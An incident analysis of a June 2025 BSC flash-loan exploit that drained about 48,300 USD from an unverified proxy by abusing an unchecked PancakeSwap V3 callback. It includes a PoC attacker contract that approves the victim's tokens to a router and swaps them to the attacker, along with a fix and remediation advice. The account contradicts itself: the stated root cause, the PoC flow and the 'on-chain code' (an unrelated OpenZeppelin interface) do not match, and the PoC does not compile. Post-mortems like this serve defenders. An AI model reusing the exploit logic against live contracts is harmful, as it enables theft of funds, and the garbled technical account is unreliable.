# Unverified Contract (8490) — Flash Callback Validation Absence Analysis

| Field | Details |
|------|------|
| **Date** | 2025-06-09 |
| **Protocol** | Unverified Contract (BSC) |
| **Chain** | BSC |
| **Loss** | 48,300 USD |
| **Attacker** | [0x7248939f65bdd23aab9eaab1bc4a4f909567486e](https://etherscan.io/address/0x7248939f65bdd23aab9eaab1bc4a4f909567486e) |
| **Attack Tx** | [0x9191153c...](https://bscscan.com/tx/0x9191153c8523d97f3441a08fef1da5e4169d9c2983db9398364071daa33f59d1) |
| **Vulnerable Contract** | [0x8d0D000Ee44948FC98c9B98A4FA4921476f08B0d](https://bscscan.com/address/0x8d0D000Ee44948FC98c9B98A4FA4921476f08B0d) |
| **Root Cause** | The `pancakeV3FlashCallback` function executes internal asset transfers without validating the caller (`msg.sender`) |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-06/unverified_8490_exp.sol) |

---

## 1. Vulnerability Overview

A vulnerability was discovered in an unverified contract (`TransparentUpgradeableProxy`) on the BSC chain that allows direct invocation of PancakeSwap V3's flash callback (`pancakeV3FlashCallback`). After executing a real flash loan, the attacker triggered `approve` and `transfer` operations within the callback to drain tokens held by the proxy contract. The core vulnerability is that the callback function does not verify whether `msg.sender` is a legitimate PancakeSwap V3 pool.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable pancakeV3FlashCallback: no caller validation
contract TransparentUpgradeableProxy {
    // or inside the implementation contract

    function pancakeV3FlashCallback(
        uint256 /*amount0*/,
        uint256 /*amount1*/,
        bytes calldata /*data*/
    ) external {
        // ❌ No check that msg.sender is an actual PancakeSwap V3 pool
        // ❌ Anyone can call this callback directly

        // Internal approve execution
        Token.approve(SmartRouter, LARGE_AMOUNT); // ❌ Arbitrary approve
        // Internal transfer execution
        Token.transfer(ATTACKER, BALANCE); // ❌ Asset theft
    }
}

// ✅ Correct code
function pancakeV3FlashCallback(
    uint256 amount0,
    uint256 amount1,
    bytes calldata data
) external {
    // ✅ Validate against the actual PancakeSwap V3 pool address
    address expectedPool = IPancakeV3Factory(factory).getPool(token0, token1, fee);
    require(msg.sender == expectedPool, "Not authorized pool");
    // Execute only the flash loan repayment logic
}
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: draft-IERC1822.sol
// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.5.0) (interfaces/draft-IERC1822.sol)

pragma solidity ^0.8.0;

/**
 * @dev ERC1822: Universal Upgradeable Proxy Standard (UUPS) documents a method for upgradeability through a simplified
 * proxy whose upgrades are fully controlled by the current implementation.
 */
interface IERC1822Proxiable {
    /**
     * @dev Returns the storage slot that the proxiable contract assumes is being used to store the implementation
     * address.
     *
     * IMPORTANT: A proxy pointing at a proxiable contract should not be considered proxiable itself, because this risks
     * bricking a proxy that upgrades to it, by delegating to itself until out of gas. Thus it is critical that this
     * function revert if invoked through a proxy.
     */
    function proxiableUUID() external view returns (bytes32);
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─[1]─► Call PancakeV3Pool.flash() (execute real flash loan)
  │         └─► PancakeV3Pool calls back into attacker contract's callback
  │
  ├─[2]─► Inside pancakeV3FlashCallback:
  │         ├─► Call TransparentUpgradeableProxy.approve(SmartRouter, MAX)
  │         │    └─► ❌ Vulnerable contract sets max approval for SmartRouter
  │         └─► (or execute direct transfer)
  │
  ├─[3]─► Call SmartRouter.exactInputSingle()
  │         └─► Swap approved Tokens in favor of attacker
  │         └─► Drain Token from TransparentUpgradeableProxy
  │
  ├─[4]─► Repay flash loan (minimal cost)
  │
  └─[5]─► Net profit: ~48,300 USD
```

## 4. PoC Code (Core Logic + Comments)

```solidity
contract AttackerC {
    function attack() public {
        // [1] Execute PancakeV3 flash loan (from actual V3 pool)
        IPancakeV3Pool_Local(PancakeV3Pool).flash(
            address(this),
            FLASH_AMOUNT, // token0 (or token1)
            0,
            "" // data
        );
    }

    function pancakeV3FlashCallback(
        uint256 /*amount0*/,
        uint256 /*amount1*/,
        bytes calldata /*data*/
    ) external {
        // [2] Trigger the approve function on the vulnerable contract
        // Configure TransparentUpgradeableProxy to trust SmartRouter
        {
            (bool ok,) = TransparentUpgradeableProxy.call(
                abi.encodeWithSignature(
                    "approve(address,uint256)",
                    SmartRouter,
                    type(uint256).max
                )
            );
            require(ok, "approve failed");
        }

        // [3] Swap vulnerable contract's assets via SmartRouter
        {
            ExactInputSingleParams memory params = ExactInputSingleParams({
                tokenIn: Token,           // Token held by the vulnerable contract
                tokenOut: address(0)...,  // Output token
                fee: 500,
                recipient: attacker,       // Send to attacker
                amountIn: TOKEN_BALANCE,   // Drain entire balance
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            });
            ISmartRouter(SmartRouter).exactInputSingle(params);
        }

        // [4] Repay flash loan (return to PancakeV3Pool)
        {
            (bool ok,) = Token.call(
                abi.encodeWithSignature(
                    "transfer(address,uint256)",
                    PancakeV3Pool,
                    FLASH_AMOUNT + FEE
                )
            );
            require(ok, "transfer failed");
        }
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|------|
| **Vulnerability Type** | Missing Flash Callback Caller Validation |
| **Attack Technique** | PancakeSwap V3 Flash Callback Exploitation |
| **DASP Category** | Access Control |
| **CWE** | CWE-284: Improper Access Control |
| **Severity** | Critical |
| **Attack Complexity** | Low-Medium |

## 6. Remediation Recommendations

1. **Mandatory Callback Caller Validation**: Inside `pancakeV3FlashCallback`, always verify that `msg.sender` is a legitimate registered V3 pool.
2. **Factory-Based Validation**: Confirm the actual pool address via `IPancakeV3Factory(FACTORY).getPool(token0, token1, fee)`.
3. **Principle of Minimal Approval**: When a contract approves an external router, grant only the minimum required amount.
4. **Source Code Disclosure**: Depositing assets into unverified contracts means vulnerabilities like this go undetected.

## 7. Lessons Learned

- **Recurring Pattern**: The same pattern that occurred in Unverified_6077 (April) resurfaced in June. Missing basic callback validation is an extremely common vulnerability.
- **Vulnerabilities Within TransparentUpgradeableProxy**: Even when using the upgradeable proxy pattern, security vulnerabilities in the implementation contract remain fully exposed.
- **PancakeSwap V3 Callback Security**: PancakeSwap V3's official documentation explicitly requires `msg.sender` validation within callbacks. This incident is the result of ignoring that requirement.